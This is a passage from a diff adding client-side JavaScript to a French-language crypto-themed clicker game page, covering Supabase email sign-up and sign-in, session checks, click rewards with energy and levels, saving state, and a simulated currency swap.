+      await supabaseClient.from("user_state").upsert({ id:userId, ...state })
+    } catch(e){ console.error(e) }
+  }
+
+  function updateUI(){
+    document.getElementById("deadspot").innerText = state.deadspot.toFixed(4)
+    document.getElementById("diamonds").innerText = state.diamonds
+    document.getElementById("xp").innerText = state.xp.toFixed(2)
+    document.getElementById("level").innerText = state.level
+    document.getElementById("energy").innerText = state.energy
+    document.getElementById("energyMax").innerText = state.energyMax
+    document.getElementById("energy-fill").style.width = (state.energy/state.energyMax*100)+"%"
+  }
+
+  // ---- Auth ----
+  document.getElementById("btnSignUp").addEventListener("click", async () => {
+    const email = document.getElementById("email").value
+    const password = document.getElementById("password").value
+    const { error } = await supabaseClient.auth.signUp({ email, password })
+    if(error) alert(error.message)
+    else alert("Inscription réussie ! Vérifiez votre email")
+  })
+
+  document.getElementById("btnSignIn").addEventListener("click", async () => {
+    const email = document.getElementById("email").value
+    const password = document.getElementById("password").value
+    const { error } = await supabaseClient.auth.signInWithPassword({ email, password })
+    if(error) alert(error.message)
+    else {
+      document.getElementById("login-overlay").style.display="none"
+      document.getElementById("app").style.display="block"
+      await loadUserState()
+    }
+  })
+
+  // ---- Clicker ----
+  document.getElementById("clickBtn").addEventListener("click", () => {
+    if(state.energy <= 0) return alert("Pas assez d'énergie")
+    state.energy -= 1
+    const gain = 0.0001 + Math.random()*0.27
+    state.deadspot += gain
+    state.xp += 0.175
+    if(state.xp > (15 * Math.pow(1.27, state.level-1))) {
+      state.level++; state.diamonds += 1
+    }
+    updateUI(); saveUserState()
+  })
+
+  // ---- Check session on load ----
+  window.addEventListener("load", async () => {
+    const { data: { session } } = await supabaseClient.auth.getSession()
+    if(session){
+      document.getElementById("login-overlay").style.display="none"
+      document.getElementById("app").style.display="block"
+      await loadUserState()
+    }
+  })
+
+  // ---- Swap placeholder ----
+  document.getElementById("swapBtn").addEventListener("click", () => {
+    const amount = parseFloat(document.getElementById("swapAmount").value)
+    const currency = document.getElementById("swapCurrency").value
+    if(!amount || amount <= 0) return alert("Montant invalide")
+    document.getElementById("swapResult").innerText = `Swappé ${amount} vers ${currency} (simulation)`
+  })
 </script>
+
 </body>
 </html>
 
